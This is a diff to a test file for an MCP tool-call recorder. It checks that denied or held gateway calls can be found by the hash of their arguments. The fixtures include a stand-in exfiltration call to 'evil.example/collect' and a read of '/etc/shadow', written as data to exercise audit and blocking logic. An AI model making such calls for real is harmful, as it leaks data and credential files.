@@ -2,7 +2,7 @@ import { describe, it, expect, beforeAll, afterAll } from 'vitest';
 import { mkdtempSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
-import { GENESIS_HASH, makeRecord, sha256Ref } from '../src/chain/hash.js';
+import { GENESIS_HASH, canonicalJson, makeRecord, sha256Ref } from '../src/chain/hash.js';
 import { openStore } from '../src/store/index.js';
 import { Redactor } from '../src/redact/redactor.js';
 import { queryStore } from '../src/query/touched.js';
@@ -527,5 +527,136 @@ describe('queryStore over gateway-mode events (policy_decision kind, tool_call.g
 
   it('a needle that appears nowhere yields no matches, gateway events included', () => {
     expect(queryStore(store, 'no-such-value-anywhere').matches).toEqual([]);
+  });
+});
+
+/* ------------------- policy_decision.args_hash (gateway mode) -------------------
+ * A denied or held call never reaches the server, so its arguments exist
+ * nowhere in the chain except as `args_hash` — sha256 of their canonical
+ * JSON — on the policy_decision. Querying those exact canonical arguments
+ * has to name the refused call (the replay page's client-side search
+ * already matches this field).
+ */
+
+describe('queryStore — policy_decision.args_hash', () => {
+  const SESSION_H = 'ffffffff-ffff-4fff-8fff-ffffffffffff';
+  const DENIED_ARGS = { url: 'https://evil.example/collect', body: 'payload-7f3e' };
+  const HELD_ARGS = { path: '/etc/shadow', mode: 'read' };
+  const DENIED_CANONICAL = canonicalJson(DENIED_ARGS);
+  const HELD_CANONICAL = canonicalJson(HELD_ARGS);
+
+  let dir: string;
+  let store: EvidenceStore;
+
+  function decision(
+    timestamp: string,
+    requestId: number,
+    tool: string,
+    argsHash: string,
+    over: Partial<PolicyDecisionEvent> = {},
+  ): PolicyDecisionEvent {
+    return {
+      schema: SCHEMA,
+      event_id: fakeUuid(),
+      session_id: SESSION_H,
+      timestamp,
+      kind: 'policy_decision',
+      identity: IDENTITY,
+      server: SERVER,
+      attributes: { 'gen_ai.tool.name': tool, 'cresec.policy.decision': 'deny' },
+      decision: 'deny',
+      tool,
+      request_id: requestId,
+      rule_id: 'no-exfil',
+      policy_hash: sha256Ref('policy bytes'),
+      args_hash: argsHash,
+      ...over,
+    };
+  }
+
+  beforeAll(() => {
+    dir = mkdtempSync(join(tmpdir(), 'mcp-recorder-query-args-'));
+    store = openStore({ dataDir: dir, backend: 'sqlite' });
+    store.append(
+      seal([
+        sessionStart(SESSION_H, '2026-06-14T08:00:00.000Z', IDENTITY),
+        decision('2026-06-14T08:00:01.000Z', 11, 'http_post', sha256Ref(DENIED_CANONICAL)),
+        decision('2026-06-14T08:00:02.000Z', 12, 'read_file', sha256Ref(HELD_CANONICAL), {
+          decision: 'hold',
+          outcome: 'timeout',
+          rule_id: 'needs-human',
+          approval_id: 'hold-1',
+          waited_ms: 30_000,
+        }),
+        toolCall(SESSION_H, '2026-06-14T08:00:03.000Z', 'list_dir', { path: '/tmp' }),
+        sessionEnd(SESSION_H, '2026-06-14T08:00:04.000Z'),
+      ]),
+    );
+  });
+
+  afterAll(() => {
+    store.close();
+    rmSync(dir, { recursive: true, force: true });
+  });
+
+  it('finds the denied call from the exact canonical JSON of its arguments', () => {
+    const result = queryStore(store, DENIED_CANONICAL);
+    expect(result.needle_hash).toBe(sha256Ref(DENIED_CANONICAL));
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toEqual({
+      seq: 2,
+      session_id: SESSION_H,
+      timestamp: '2026-06-14T08:00:01.000Z',
+      kind: 'policy_decision',
+      name: 'http_post',
+      matched_on: 'args_hash',
+      path: '$.args_hash',
+    });
+  });
+
+  it('finds a HELD call the same way', () => {
+    const result = queryStore(store, HELD_CANONICAL);
+    expect(result.matches).toHaveLength(1);
+    expect(result.matches[0]).toMatchObject({
+      seq: 3,
+      kind: 'policy_decision',
+      name: 'read_file',
+      matched_on: 'args_hash',
+      path: '$.args_hash',
+    });
+  });
+
+  it('lists the touched session and stays valid JSON output', () => {
+    const result = queryStore(store, DENIED_CANONICAL);
+    expect(result.sessions.map((s) => s.session_id)).toEqual([SESSION_H]);
+    expect(JSON.parse(JSON.stringify(result))).toEqual(result);
+    expect(store.sessions().some((s) => s.session_id === SESSION_H)).toBe(true);
+  });
+
+  it('is exact: a different key order, a subset or a raw argument value does not match', () => {
+    for (const needle of [
+      JSON.stringify(DENIED_ARGS), // insertion order, not canonical order
+      canonicalJson({ url: DENIED_ARGS.url }),
+      DENIED_ARGS.body,
+      DENIED_ARGS.url,
+    ]) {
+      expect(queryStore(store, needle).matches.filter((m) => m.matched_on === 'args_hash')).toEqual([]);
+    }
+    // ...and the arguments themselves never read back in clear.
+    expect(JSON.stringify([...store.iterate()])).not.toContain(DENIED_ARGS.body);
+    expect(JSON.stringify([...store.iterate()])).not.toContain(HELD_ARGS.path);
+  });
+
+  it('a stronger location still wins on the same event', () => {
+    // The tool name of the denied call is a plain `name` match, which is
+    // WEAKER than args_hash; an args_hash hit must be the reported one.
+    const byName = queryStore(store, 'http_post');
+    expect(byName.matches.find((m) => m.kind === 'policy_decision')).toMatchObject({ matched_on: 'name' });
+    const byArgs = queryStore(store, DENIED_CANONICAL);
+    expect(byArgs.matches[0]!.matched_on).toBe('args_hash');
+  });
+
+  it('scoping to another session finds nothing', () => {
+    expect(queryStore(store, DENIED_CANONICAL, { sessionId: SESSION_A }).matches).toEqual([]);
   });
 });
